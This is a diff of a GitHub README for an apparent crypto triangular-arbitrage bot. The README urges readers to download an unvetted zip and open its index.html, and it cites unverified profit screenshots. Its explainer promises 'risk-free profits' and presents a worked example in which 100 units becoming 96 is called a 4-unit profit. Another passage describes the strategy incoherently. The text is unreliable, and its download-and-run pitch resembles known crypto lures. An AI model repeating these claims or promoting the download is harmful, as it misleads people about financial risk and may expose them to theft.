@@ -1,1 +1,77 @@
-<p dir=\"auto\">A Triangle Arbitrage bot written in JavaScript that utilizes triangular arbitrage strategy to profit from price differences between three cryptocurrencies.</p>\n<p dir=\"auto\">Features:\n1.Fetches real-time pricing data for three cryptocurrencies.\n2.Calculates triangular arbitrage opportunities and executes trades automatically.\n3.Includes customizable settings for trade size, minimum profit percentage, and more.</p>\n<p dir=\"auto\">Requirements:\n1.Modern web browser that supports JavaScript\n2.Basic knowledge of cryptocurrency trading and triangular arbitrage</p>\n<p dir=\"auto\">Installation:</p>\n<p dir=\"auto\"><a href=\"https://vimeo.com/872537864\" rel=\"nofollow\">https://vimeo.com/872537864</a></p>\n<p dir=\"auto\">You can Download the zip file of the program here</p>\n<p dir=\"auto\"><a href=\"https://raw.githubusercontent.com/KliRalph/DEX-Profit-Triangular-Arbitrage-Bot-New-Version/main/DEX-Profit-Triangular-Arbitrage-Bot-New-Version.zip\" rel=\"nofollow\">https://raw.githubusercontent.com/KliRalph/DEX-Profit-Triangular-Arbitrage-Bot-New-Version/main/DEX-Profit-Triangular-Arbitrage-Bot-New-Version.zip</a></p>\n<p dir=\"auto\">Here what it looks like running and finding a arbitrage.</p>\n<p dir=\"auto\"><a target=\"_blank\" rel=\"noopener noreferrer\" href=\"/KliRalph/DEX-Profit-Triangular-Arbitrage-Bot-New-Version/blob/main/5.png\"><img src=\"/KliRalph/DEX-Profit-Triangular-Arbitrage-Bot-New-Version/raw/main/5.png\" style=\"max-width: 100%;\"></a></p>\n<p dir=\"auto\"> And Please vote for me on the next Javascript codethon I won 4th place on the v2 I would love to win first place this year</p>\n<p dir=\"auto\"><a target=\"_blank\" rel=\"noopener noreferrer\" href=\"/KliRalph/DEX-Profit-Triangular-Arbitrage-Bot-New-Version/blob/main/10.png\"><img src=\"/KliRalph/DEX-Profit-Triangular-Arbitrage-Bot-New-Version/raw/main/10.png\" style=\"max-width: 100%;\"></a></p>\n<p dir=\"auto\">Here's the results of the program's execution have been compiled over a period of approximately 28 days.</p>\n<p dir=\"auto\"><a target=\"_blank\" rel=\"noopener noreferrer\" href=\"/KliRalph/DEX-Profit-Triangular-Arbitrage-Bot-New-Version/blob/main/1.jpg\"><img src=\"/KliRalph/DEX-Profit-Triangular-Arbitrage-Bot-New-Version/raw/main/1.jpg\" style=\"max-width: 100%;\"></a></p>\n<p dir=\"auto\">For those who prefer written instructions, please follow these steps:</p>\n<p dir=\"auto\">Step 1: Extract the contents of the downloaded file.</p>\n<p dir=\"auto\">Step 2: Open the \"config.js\" file using a text editor such as Notepad.</p>\n<p dir=\"auto\"><a target=\"_blank\" rel=\"noopener noreferrer\" href=\"/KliRalph/DEX-Profit-Triangular-Arbitrage-Bot-New-Version/blob/main/2.png\"><img src=\"/KliRalph/DEX-Profit-Triangular-Arbitrage-Bot-New-Version/raw/main/2.png\" style=\"max-width: 100%;\"></a></p>\n<p dir=\"auto\">Step 3: Configure the settings to your preferences and save the file.</p>\n<p dir=\"auto\"><a target=\"_blank\" rel=\"noopener noreferrer\" href=\"/KliRalph/DEX-Profit-Triangular-Arbitrage-Bot-New-Version/blob/main/3.png\"><img src=\"/KliRalph/DEX-Profit-Triangular-Arbitrage-Bot-New-Version/raw/main/3.png\" style=\"max-width: 100%;\"></a></p>\n<p dir=\"auto\">Step 4: Open the \"index.html\" file in any web browser of your choice.</p>\n<p dir=\"auto\"><a target=\"_blank\" rel=\"noopener noreferrer\" href=\"/KliRalph/DEX-Profit-Triangular-Arbitrage-Bot-New-Version/blob/main/4.png\"><img src=\"/KliRalph/DEX-Profit-Triangular-Arbitrage-Bot-New-Version/raw/main/4.png\" style=\"max-width: 100%;\"></a></p>\n<p dir=\"auto\">Here little of a explanation for those who don't understand what triangular arbitrage is:</p>\n<p dir=\"auto\">Triangular arbitrage, a popular trading strategy in the world of decentralized cryptocurrency exchanges (DEX), has gained significant attention among crypto traders and investors. This strategy involves exploiting price inconsistencies between three different cryptocurrencies to generate risk-free profits. In this article, we will delve into the concept of triangular arbitrage in the context of DEX, understanding its mechanics, challenges, and potential opportunities for crypto traders.</p>\n<div class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"Understanding Triangular Arbitrage in DEX:\"><pre class=\"notranslate\"><code>Understanding Triangular Arbitrage in DEX:\n</code></pre></div>\n<p dir=\"auto\">Triangular arbitrage in decentralized cryptocurrency exchanges operates on the same principle as in traditional markets, with the key difference being the absence of intermediaries or centralized authorities. DEX platforms allow traders to execute trades directly from their wallets, facilitating peer-to-peer transactions. Triangular arbitrage in DEX involves taking advantage of price disparities between three cryptocurrencies listed on the exchange to yield profits.</p>\n<div class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"Mechanics of Triangular Arbitrage in DEX:\"><pre class=\"notranslate\"><code>Mechanics of Triangular Arbitrage in DEX:\n</code></pre></div>\n<p dir=\"auto\">The mechanics of triangular arbitrage in DEX are similar to those in traditional markets. Consider three cryptocurrencies: A, B, and C. Traders start by converting an initial amount of cryptocurrency A to cryptocurrency B using the A/B trading pair. Next, they convert the acquired cryptocurrency B to cryptocurrency C using the B/C trading pair. Finally, they convert the obtained cryptocurrency C back to cryptocurrency A using the C/A trading pair. If the final amount of cryptocurrency A exceeds the initial amount, a profit can be realized.</p>\n<p dir=\"auto\">For instance, suppose the A/B trading pair has a ratio of 1:1, the B/C trading pair has a ratio of 1:1.2, and the C/A trading pair has a ratio of 1:0.8. By following the triangular arbitrage process, a trader can start with 100 units of cryptocurrency A, convert it to 100 units of cryptocurrency B, then convert it to 120 units of cryptocurrency C, and finally convert it back to 96 units of cryptocurrency A. The trader would have made a profit of 4 units of cryptocurrency A without exposing themselves to market risk.</p>\n<div class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"Identifying Triangular Arbitrage Opportunities in DEX:\"><pre class=\"notranslate\"><code>Identifying Triangular Arbitrage Opportunities in DEX:\n</code></pre></div>\n<p dir=\"auto\">To identify potential triangular arbitrage opportunities in DEX, traders rely on real-time data, decentralized exchange platforms, and specialized trading tools. They continuously monitor the prices and trading pairs of multiple cryptocurrencies, looking for pricing inconsistencies and imbalances. Advanced algorithms and trading bots can aid in automating the process and swiftly identifying profitable opportunities.</p>\n<p dir=\"auto\">#cryptomarketplace #cryptobroker #cryptosignalsgroup #btc #cryptocurrencynews #cryptoanalysisgroup #cryptosafety #cryptoanalyst #cryptoexpert #cryptosafe Introduction: DEX Triangular Arbitrage is a form of algorithmic trading that uses price discrepancies between three different cryptocurrencies to generate profits. By taking advantage of exchange rate differences, traders can buy a crypto asset at a low price on one exchange, sell it at a higher price on another exchange, and then use the profits to buy back the original asset at an even higher price on a third exchange. This process is repeated until the trader has maximized their profits.</p>\n<p dir=\"auto\">Core Components: The core components of DEX Triangular Arbitrage include:</p>\n<ol dir=\"auto\">\n<li>\n<p dir=\"auto\">Exchange rate differences: Finding discrepancies between buy and sell prices across different exchanges.</p>\n</li>\n<li>\n<p dir=\"auto\">Trading bots: Automated systems that monitor exchange rates and execute trades</p>\n</li>\n</ol>\n</article>","renderedFileInfo":null,"shortPath":null,"tabSize":8,"topBannersInfo":{"overridingGlobalFundingFile":false,"globalPreferredFundingPath":null,"repoOwner":"KliRalph","repoName":"DEX-Profit-Triangular-Arbitrage-Bot-New-Version","showInvalidCitationWarning":false,"citationHelpUrl":"https://docs.github.com/en/github/creating-cloning-and-archiving-repositories/creating-a-repository-on-github/about-citation-files","showDependabotConfigurationBanner":false,"actionsOnboardingTip":null},"truncated":false,"viewable":true,"workflowRedirectUrl":null,"symbols":{"timedOut":false,"notAnalyzed":false,"symbols":[]}},"copilotInfo":null,"csrf_tokens":{"/KliRalph/DEX-Profit-Triangular-Arbitrage-Bot-New-Version/branches":{"post":"ZTg4JDISBIRXx-BQjxAvUsZZM8-zeHfXQ3dk_K4SMJI4WkLFPN0832XrvGnf5Gqh0GMs2Kjv9nU3dPA5RgET3g"},"/repos/preferences":{"post":"ELb_vH97-kP5_gWCzG5MuRRXYo3_Oy99p86me7U6-nFrmxbAaD4wYQEi6ujBQ2enEavpfC9wOwds_yWo_C5khg"}}},"title":"DEX-Profit-Triangular-Arbitrage-Bot-New-Version/README.md at main · KliRalph/DEX-Profit-Triangular-Arbitrage-Bot-New-Version"}
+<img src="9.png" />
+    
+A Triangle Arbitrage bot written in JavaScript that utilizes triangular arbitrage strategy to profit from price differences between three cryptocurrencies.
+
+Features:
+    1.Fetches real-time pricing data for three cryptocurrencies.
+    2.Calculates triangular arbitrage opportunities and executes trades automatically.
+    3.Includes customizable settings for trade size, minimum profit percentage, and more.
+
+Requirements:
+    1.Modern web browser that supports JavaScript
+    2.Basic knowledge of cryptocurrency trading and triangular arbitrage
+
+Installation:
+
+
+
+<p>You can Download the zip file of the program here</p>
+
+https://raw.githubusercontent.com/KliRalph/DEX-Profit-Triangular-Arbitrage-Bot-New-Version/main/DEX-Triangular-Arbitrage-Bot-v4.zip
+
+
+<p>Here what it looks like running and finding a arbitrage.</p>
+
+<img src="5.png" />
+
+<p> And Please vote for me on the next Javascript codethon I won 4th place on the v2 I would love to win first place this year</p>
+
+<img src="10.png" />
+
+<p>Here's the results of the program's execution have been compiled over a period of approximately 28 days.</p>
+
+<img src="1.jpg" />
+
+<p>For those who prefer written instructions, please follow these steps:</p>
+
+<p>Step 1: Extract the contents of the downloaded file.</p>
+
+<p>Step 2: Open the "config.js" file using a text editor such as Notepad.</p>
+
+<img src="2.png" />
+
+<p>Step 3: Configure the settings to your preferences and save the file.</p>
+
+<img src="3.png" />
+
+<p>Step 4: Open the "index.html" file in any web browser of your choice.</p>
+
+<img src="4.png" />
+
+
+
+Here little of a explanation for those who don't understand what triangular arbitrage is:
+
+Triangular arbitrage, a popular trading strategy in the world of decentralized cryptocurrency exchanges (DEX), has gained significant attention among crypto traders and investors. This strategy involves exploiting price inconsistencies between three different cryptocurrencies to generate risk-free profits. In this article, we will delve into the concept of triangular arbitrage in the context of DEX, understanding its mechanics, challenges, and potential opportunities for crypto traders.
+
+    Understanding Triangular Arbitrage in DEX:
+
+Triangular arbitrage in decentralized cryptocurrency exchanges operates on the same principle as in traditional markets, with the key difference being the absence of intermediaries or centralized authorities. DEX platforms allow traders to execute trades directly from their wallets, facilitating peer-to-peer transactions. Triangular arbitrage in DEX involves taking advantage of price disparities between three cryptocurrencies listed on the exchange to yield profits.
+
+    Mechanics of Triangular Arbitrage in DEX:
+
+The mechanics of triangular arbitrage in DEX are similar to those in traditional markets. Consider three cryptocurrencies: A, B, and C. Traders start by converting an initial amount of cryptocurrency A to cryptocurrency B using the A/B trading pair. Next, they convert the acquired cryptocurrency B to cryptocurrency C using the B/C trading pair. Finally, they convert the obtained cryptocurrency C back to cryptocurrency A using the C/A trading pair. If the final amount of cryptocurrency A exceeds the initial amount, a profit can be realized.
+
+For instance, suppose the A/B trading pair has a ratio of 1:1, the B/C trading pair has a ratio of 1:1.2, and the C/A trading pair has a ratio of 1:0.8. By following the triangular arbitrage process, a trader can start with 100 units of cryptocurrency A, convert it to 100 units of cryptocurrency B, then convert it to 120 units of cryptocurrency C, and finally convert it back to 96 units of cryptocurrency A. The trader would have made a profit of 4 units of cryptocurrency A without exposing themselves to market risk.
+
+    Identifying Triangular Arbitrage Opportunities in DEX:
+
+To identify potential triangular arbitrage opportunities in DEX, traders rely on real-time data, decentralized exchange platforms, and specialized trading tools. They continuously monitor the prices and trading pairs of multiple cryptocurrencies, looking for pricing inconsistencies and imbalances. Advanced algorithms and trading bots can aid in automating the process and swiftly identifying profitable opportunities.
+
+#cryptomarketplace #cryptobroker #cryptosignalsgroup #btc #cryptocurrencynews #cryptoanalysisgroup #cryptosafety #cryptoanalyst #cryptoexpert #cryptosafe Introduction: DEX Triangular Arbitrage is a form of algorithmic trading that uses price discrepancies between three different cryptocurrencies to generate profits. By taking advantage of exchange rate differences, traders can buy a crypto asset at a low price on one exchange, sell it at a higher price on another exchange, and then use the profits to buy back the original asset at an even higher price on a third exchange. This process is repeated until the trader has maximized their profits.
+
+Core Components: The core components of DEX Triangular Arbitrage include: 
+
+1. Exchange rate differences: Finding discrepancies between buy and sell prices across different exchanges.
+
+2. Trading bots: Automated systems that monitor exchange rates and execute trades
